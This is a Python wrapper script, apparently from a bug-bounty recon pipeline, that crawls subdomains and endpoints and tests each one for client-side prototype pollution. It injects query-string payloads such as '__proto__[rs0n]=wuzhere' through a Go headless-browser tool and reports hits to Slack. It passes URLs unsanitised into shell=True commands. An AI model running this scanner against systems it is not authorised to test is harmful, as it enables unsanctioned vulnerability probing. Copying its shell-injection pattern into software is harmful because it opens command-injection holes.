# Wrapper around go script that checks for Prototype Pollution and sends notification to Slack channel

import requests, sys, subprocess, getopt, json, time, math, threading
from datetime import datetime

def proto_check(self, url):
    print(f"Checking {url}")
    domain_check = subprocess.run([f"~/go/bin/Run_JS -u '{url}' -j 'window.location.href'"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, shell=True)
    final_url = domain_check.stdout
    if "?" in final_url:
        proto_pollution_check = subprocess.run([f"~/go/bin/Run_JS -u '{final_url}&__proto__[rs0n]=wuzhere' -j 'window.rs0n'"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, shell=True)
        if "[!] ERROR" not in proto_pollution_check.stdout and "wuzhere" in proto_pollution_check.stdout:
            message_json = {'text':f'{final_url} appears to be vulnerable to Prototype Pollution attacks!\n\nPayload: {final_url}&__proto__[rs0n]=wuzhere\nResponse: {proto_pollution_check.stdout}','username':'Vuln Disco Box','icon_emoji':':dart:'}
            f = open(f'{home_dir}/.keys/slack_web_hook')
            token = f.read()
            slack_auto = requests.post(f'https://hooks.slack.com/services/{token}', json=message_json)
        else:
            proto_pollution_constructor_check = subprocess.run([f"~/go/bin/Run_JS -u '{final_url}&constructor[prototype][rs0n]=wuzhere' -j 'window.rs0n'"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, shell=True)
            if "[!] ERROR" not in proto_pollution_constructor_check.stdout and "wuzhere" in proto_pollution_constructor_check.stdout:
                message_json = {'text':f'{final_url} appears to be vulnerable to Prototype Pollution attacks!\n\nPayload: {final_url}&constructor[__proto__][rs0n]=wuzhere\nResponse: {proto_pollution_check.stdout}','username':'Vuln Disco Box','icon_emoji':':dart:'}
                f = open(f'{home_dir}/.keys/slack_web_hook')
                token = f.read()
                slack_auto = requests.post(f'https://hooks.slack.com/services/{token}', json=message_json)

    else:
        proto_pollution_check = subprocess.run([f"~/go/bin/Run_JS -u '{final_url}?__proto__[rs0n]=wuzhere' -j 'window.rs0n'"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, shell=True)
        if "[!] ERROR" not in proto_pollution_check.stdout and "wuzhere" in proto_pollution_check.stdout:
            message_json = {'text':f'{final_url} appears to be vulnerable to Prototype Pollution attacks!\n\nPayload: {final_url}?__proto__[rs0n]=wuzhere\nResponse: {proto_pollution_check.stdout}','username':'Vuln Disco Box','icon_emoji':':dart:'}
            f = open(f'{home_dir}/.keys/slack_web_hook')
            token = f.read()
            slack_auto = requests.post(f'https://hooks.slack.com/services/{token}', json=message_json)
        else:
            proto_pollution_constructor_check = subprocess.run([f"~/go/bin/Run_JS -u '{final_url}?constructor[prototype][rs0n]=wuzhere' -j 'window.rs0n'"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, shell=True)
            if "[!] ERROR" not in proto_pollution_constructor_check.stdout and "wuzhere" in proto_pollution_constructor_check.stdout:
                message_json = {'text':f'{final_url} appears to be vulnerable to Prototype Pollution attacks!\n\nPayload: {final_url}?constructor[__proto__][rs0n]=wuzhere\nResponse: {proto_pollution_check.stdout}','username':'Vuln Disco Box','icon_emoji':':dart:'}
                f = open(f'{home_dir}/.keys/slack_web_hook')
                token = f.read()
                slack_auto = requests.post(f'https://hooks.slack.com/services/{token}', json=message_json)

full_cmd_arguments = sys.argv
argument_list = full_cmd_arguments[1:]
short_options = "d:T:"
long_options = ["domain=", "threads="]

try:
    arguments, values = getopt.getopt(argument_list, short_options, long_options)
except:
    sys.exit(2)

for current_argument, current_value in arguments:
    if current_argument in ("-d", "--domain"):
        fqdn = current_value
    if current_argument in ("-T", "--threads"):
        threads = int(current_value)

get_home_dir = subprocess.run(["echo $HOME"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, shell=True)
home_dir = get_home_dir.stdout.replace("\n", "")

now_start = datetime.now().strftime("%d-%m-%y_%I%p")
f = open(f"{home_dir}/Logs/automation.log", "a")
f.write(f"Prototype Pollution Scan on {fqdn} - Start Time: {now_start}\n")
f.close()

start = time.time()

r = requests.post('http://10.0.0.211:8000/api/auto', data={'fqdn':fqdn})
thisFqdn = r.json()

httprobe_arr = thisFqdn['recon']['subdomains']['httprobe']
masscan_arr = thisFqdn['recon']['subdomains']['masscanLive']

urls = httprobe_arr + masscan_arr
for url in urls:
    r = requests.post('http://10.0.0.211:8000/api/url/auto', data={'url':url})
    thisUrl = r.json()
    if thisUrl:
        if thisUrl['url'].endswith('/'):
            workingUrl = thisUrl['url'][:-1]
        else:
            workingUrl = thisUrl['url']
        for endpoint in thisUrl['endpoints']:
            uri = workingUrl + endpoint['endpoint']
            if uri not in urls:
                urls.append(f"{workingUrl}{endpoint['endpoint']}")
length = len(urls)
print(f"Total URLs: {length}")

while len(urls) > 0:
    if len(urls) < threads:
        x_ls = list(range(len(urls)))
    else:
        x_ls = list(range(threads))
    thread_list = []
    for x in x_ls:
        u = urls[0]
        thisUrl = urls[0]
        urls.remove(u)
        thread = threading.Thread(target=proto_check, args=(x, u))
        thread_list.append(thread)
    for thread in thread_list:
        thread.start()
    for thread in thread_list:
        thread.join()
    new_length = len(urls)
    print(f"URLs remaining: {new_length}")
